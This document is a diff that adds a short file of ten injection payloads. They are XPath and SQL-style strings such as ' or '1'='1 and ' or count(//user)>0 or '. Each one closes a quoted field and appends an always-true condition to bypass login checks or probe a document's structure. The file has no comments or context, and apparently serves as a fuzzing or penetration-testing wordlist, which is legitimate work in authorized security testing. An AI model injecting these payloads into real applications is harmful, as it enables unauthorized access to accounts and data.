@@ -1,0 +1,10 @@
+' or '1'='1
+' or 1=1 or ''='
+' or 'a'='a
+' or true() or '
+' or 1=1] |
+' or position()=1 or '
+' or 'x'='x
+' or count(//user)>0 or '
+' or name()!=''
+' or string-length(name())>0
